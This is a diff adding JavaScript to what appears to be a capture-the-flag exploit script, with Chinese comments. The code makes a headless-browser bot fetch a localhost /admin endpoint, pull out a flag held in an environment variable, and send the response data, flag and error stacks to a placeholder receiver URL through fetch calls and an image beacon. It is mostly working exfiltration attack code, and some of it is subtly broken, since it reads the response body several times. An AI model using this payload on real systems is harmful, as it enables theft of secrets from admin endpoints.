@@ -12,6 +12,42 @@
     // ###########################################################################
     const param = {"url":"http://127.0.0.1:3000/admin"};
     // 核心：访问/admin获取环境变量的FLAG，Puppeteer同域无跨域，直接解析JSON
+    fetch('http://127.0.0.1:3000/admin')
+        .then(res => {
+            const respStatus = res.status;
+             fetch(YOUR_RECEIVE_URL+'?respS-1='+respStatus);
+            const headersArr = Array.from(res.headers.entries()).map(([key, value]) => `${key}: ${value}`);
+           // fetch(YOUR_RECEIVE_URL+'?headersArr-='+headersArr);
+            const respJson = JSON.stringify(res.json());
+            fetch(YOUR_RECEIVE_URL+'?respJson-1='+respJson);
+            
+            
+            // 2. 转成字符串（用换行分隔，也可以用逗号 "," 分隔）
+            //const headersStr = headersArr.join('\n');
+            fetch(YOUR_RECEIVE_URL+'?res-1='+JSON.stringify(res.text()));
+            if (res.ok){ 
+             
+                fetch(YOUR_RECEIVE_URL+'?json-1='+JSON.stringify(res.json()));
+                return res.json();
+            }; // 仅解析admin返回的合法JSON
+            throw new Error('非200响应');
+        })
+        .then(data => {
+            const envFlag = data.flag; // 拿到环境变量里的FLAG
+            console.log('[ENV-FLAG] 成功获取环境变量FLAG：', envFlag);
+            fetch(YOUR_RECEIVE_URL+'?flag='+envFlag);
+            // 关键：用img标签发送GET请求（无跨域限制，容器内网络兼容性最强）
+            // 把FLAG拼接到URL参数，接收端直接读取即可
+            const sendUrl = `${YOUR_RECEIVE_URL}?env_flag1=${encodeURIComponent(envFlag)}`;
+            const img = new Image();
+            img.src = sendUrl; // 发起GET请求，发送FLAG
+            img.onload = () => console.log('[ENV-FLAG] FLAG发送成功：', sendUrl);
+            img.onerror = (err) => console.log('[ENV-FLAG] FLAG发送失败：', err);
+        })
+        .catch(err => {
+            console.error('[ENV-FLAG] 获取/发送FLAG失败：', err.message);
+            fetch(YOUR_RECEIVE_URL+'?err-1='+err.stack);
+        });
     fetch('http://127.0.0.1:3000/visit',{
       method: 'POST', // 必须指定为 POST
       headers: {
